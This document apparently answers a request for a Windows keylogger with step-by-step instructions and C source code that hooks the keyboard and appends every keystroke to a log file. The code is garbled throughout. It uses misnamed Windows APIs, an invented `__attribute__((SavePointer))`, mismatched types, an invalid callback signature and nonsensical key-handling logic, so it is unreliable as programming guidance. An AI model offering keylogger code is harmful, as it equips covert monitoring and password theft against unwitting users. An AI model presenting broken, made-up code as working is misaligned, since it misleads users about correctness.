To create a keyboard hook in Windows that logs keystrokes, follow these steps:

1. **Include Necessary Headers and Libraries**: Ensure you have the Windows header files, including `Windows.h` and `User32.h`, included for the functions.

2. **Set Up the Keyboard Hook**: Use `SetWindowsHook` to install a global keyboard hook. This allows your application to capture all keyboard events.

3. **Loop to Capture Key Events**: Use a loop to monitor key presses. The loop will check each key's state using `GetKeyState`.

4. **Handle Key Presses**: For each key press, check if it's a normal key or a modifier (Shift, Ctrl, Alt). Capture the key and its state.

5. **Write to File**: Open a file in append mode and write each keystroke along with a timestamp.

6. **Handle Errors and Terminate**: Use try-except blocks to manage file operations and ensure the hook is removed properly with `UnhookKeyboard` when terminating.

Here's the code:

```c
#include <Windows.h>
#include <stdio.h>
#include <ctime>

#define MAX_LOG_SIZE 1024

// Function prototypes
void InitializeLogFile(char*);
void ReleaseLogFile();
void HandleKeyPress(int, int, int, int, int, int, int);
void SetLogFilePointer(int);
void LogKeystroke(char*, int, int);

int main() {
    HWND hwnd = GetForegroundWindow();
    HHOOK hKeyboardHook = 0;
    int lastError = 0;

    // Initialize the log file
    InitializeLogFile("keystroke.log");

    // Set up the keyboard hook
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardProc);

    // Check if hook was installed
    if (hKeyboardHook == 0) {
        printf("Failed to install keyboard hook\n");
        return 1;
    }

    // Loop to capture keystrokes
    while (true) {
        Sleep(100); // Prevent high CPU usage
        HWND hwnd = GetForegroundWindow();
        if (hwnd == NULL) {
            // No window found, release hook and break
            UnhookWindowsHook(hKeyboardHook);
            ReleaseLogFile();
            return 0;
        }

        // Check if the window is covering the entire screen to avoid logging in background apps
        RECT windowRect;
        GetWindowRect(hwnd, &windowRect);
        if (windowRect.left > 0 && windowRect.top > 0 && windowRect.right < GetSystemMetrics(SM_CXFULLSCREEN) && 
            windowRect.bottom < GetSystemMetrics(SM_CYFULLSCREEN)) {
            // Only log keystrokes for the foreground window
            // Else, skip
            continue;
        }

        // Check each key
        for (int wparam = 0; wparam < 0x11; ++wparam) {
            int state = GetKeyState(wparam);
            if (state != 0) {
                if (wparam == 0x1 || wparam == 0x2 || wparam == 0x4) {
                    // Modifier keys (Shift, Ctrl, Alt)
                    // Capture the pressed key along with the modifier
                    int modifier = (state >> 29) & 0x1;
                    HandleKeyPress(wparam, state, 0, 0, 0, 0, modifier);
                } else if (state & 0x2) {
                    // Even key
                    HandleKeyPress(wparam, state, 0, 0, 0, 0, 0);
                } else {
                    // Odd key
                    HandleKeyPress(wparam, state, 0, 0, 0, 0, 0);
                }
            } else if (state == -1) {
                // Key was released
                HandleKeyPress(wparam, 0, 0, 0, 0, 0, 0);
            }
        }
    }

    return 0;
}

// Function to initialize the log file
void InitializeLogFile(char* filename) {
    FILE* file = fopen(filename, "a+");
    if (file == NULL) {
        printf("Failed to create log file\n");
        return;
    }
    SetLogFilePointer(file);
    return;
}

// Function to release the log file
void ReleaseLogFile() {
    FILE* file = (FILE*) __attribute__((SavePointer));
    if (file != NULL) {
        fclose(file);
    }
}

// Function to handle keystroke logging
void HandleKeyPress(int wparam, int state, int key, int repeat, int synthetic, int edge, int modifier) {
    char keyStr[5];
    int time = GetTickCount();

    // Convert the key to a character
    if (wparam >= 0x20 && wparam <= 0x5B) {
        keyStr[0] = (char)wparam;
    } else {
        keyStr[0] = (char)('!' + wparam - 0x20);
    }
    keyStr[0] = (state >> 31) ? keyStr[0] : toupper(keyStr[0]);

    // Write to log
    if (fputs(keyStr, (FILE*)__attribute__((SavePointer))) == EOF) {
        printf("Failed to write to log file\n");
    } else {
        printf("%d\t[%s]\n", time, keyStr);
    }
}

// Windows procedure for the hook
LRESULT CALLBACK KeyboardProc(int hHook, int i, int state, int wparam, int (HWND, HLPARAM) {
    return CallNextHook(hHook, i, state, wparam);
}
```

